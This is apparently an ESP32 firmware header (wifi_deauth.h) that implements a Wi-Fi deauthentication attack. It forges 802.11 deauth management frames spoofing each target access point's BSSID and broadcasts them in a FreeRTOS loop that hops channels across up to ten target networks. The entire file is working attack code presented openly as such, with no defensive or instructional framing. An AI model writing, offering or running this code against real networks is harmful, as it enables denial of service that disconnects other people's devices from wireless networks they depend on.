// wifi_deauth.h - Deauthentication Attack
#ifndef WIFI_DEAUTH_H
#define WIFI_DEAUTH_H

#include <stdint.h>
#include <string.h>
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#define MAX_DEAUTH_TARGETS 10

static const char *DEAUTH_TAG = "WiFi_Deauth";
static uint8_t deauth_running = 0;
static TaskHandle_t deauth_task_handle = NULL;

typedef struct {
    uint8_t bssid[6];
    uint8_t channel;
    char ssid[33];
    uint8_t active;
} DeauthTarget;

typedef struct {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t destination[6];
    uint8_t source[6];
    uint8_t bssid[6];
    uint8_t seq_ctrl[2];
    uint8_t reason[2];
} __attribute__((packed)) deauth_frame_t;

static DeauthTarget deauth_targets[MAX_DEAUTH_TARGETS];
static uint8_t deauth_target_count = 0;
static uint16_t deauth_interval = 100; // ms
static uint8_t deauth_mode = 0; // 0=broadcast, 1=targeted

// Send deauth frame
static void send_deauth(uint8_t *bssid, uint8_t *client) {
    deauth_frame_t deauth = {0};
    
    deauth.frame_ctrl[0] = 0xC0; // Type: Management, Subtype: Deauth
    deauth.frame_ctrl[1] = 0x00;
    
    deauth.duration[0] = 0x00;
    deauth.duration[1] = 0x00;
    
    memcpy(deauth.destination, client, 6);
    memcpy(deauth.source, bssid, 6);
    memcpy(deauth.bssid, bssid, 6);
    
    static uint16_t seq_num = 0;
    deauth.seq_ctrl[0] = (seq_num & 0x0F) << 4;
    deauth.seq_ctrl[1] = (seq_num & 0x0FF0) >> 4;
    seq_num++;
    
    deauth.reason[0] = 0x07; // Reason: Class 3 frame from nonassociated STA
    deauth.reason[1] = 0x00;
    
    esp_wifi_80211_tx(WIFI_IF_AP, &deauth, sizeof(deauth_frame_t), false);
}

// Deauth task
static void deauth_task(void *param) {
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    ESP_LOGI(DEAUTH_TAG, "Deauth started - %d targets, interval %dms", 
             deauth_target_count, deauth_interval);
    
    while (deauth_running) {
        for (uint8_t i = 0; i < deauth_target_count; i++) {
            if (!deauth_targets[i].active) continue;
            
            // Set channel
            esp_wifi_set_channel(deauth_targets[i].channel, WIFI_SECOND_CHAN_NONE);
            
            // Send deauth frames
            for (uint8_t j = 0; j < 5; j++) { // 5 frames per target
                send_deauth(deauth_targets[i].bssid, broadcast);
                vTaskDelay(pdMS_TO_TICKS(5));
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(deauth_interval));
    }
    
    ESP_LOGI(DEAUTH_TAG, "Deauth stopped");
    deauth_task_handle = NULL;
    vTaskDelete(NULL);
}

// Add target
static inline uint8_t deauth_add_target(uint8_t *bssid, uint8_t channel, const char *ssid) {
    if (deauth_target_count >= MAX_DEAUTH_TARGETS) return 0;
    
    memcpy(deauth_targets[deauth_target_count].bssid, bssid, 6);
    deauth_targets[deauth_target_count].channel = channel;
    strncpy(deauth_targets[deauth_target_count].ssid, ssid, 32);
    deauth_targets[deauth_target_count].ssid[32] = '\0';
    deauth_targets[deauth_target_count].active = 1;
    deauth_target_count++;
    
    ESP_LOGI(DEAUTH_TAG, "Added target: %s (ch %d)", ssid, channel);
    return 1;
}

// Clear targets
static inline void deauth_clear_targets(void) {
    deauth_target_count = 0;
}

// Start deauth
static inline uint8_t deauth_start(void) {
    if (deauth_running) return 0;
    if (deauth_target_count == 0) return 0;
    
    static uint8_t wifi_init = 0;
    if (!wifi_init) {
        esp_netif_init();
        esp_event_loop_create_default();
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        esp_wifi_init(&cfg);
        esp_wifi_set_mode(WIFI_MODE_AP);
        esp_wifi_start();
        wifi_init = 1;
    }
    
    deauth_running = 1;
    
    BaseType_t result = xTaskCreate(deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
    if (result != pdPASS) {
        deauth_running = 0;
        return 0;
    }
    
    return 1;
}

// Stop deauth
static inline void deauth_stop(void) {
    if (!deauth_running) return;
    deauth_running = 0;
    uint8_t wait = 0;
    while (deauth_task_handle != NULL && wait++ < 50) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}

// Get target count
static inline uint8_t deauth_get_target_count(void) {
    return deauth_target_count;
}

// Get target
static inline DeauthTarget* deauth_get_target(uint8_t index) {
    if (index >= deauth_target_count) return NULL;
    return &deauth_targets[index];
}

#endif
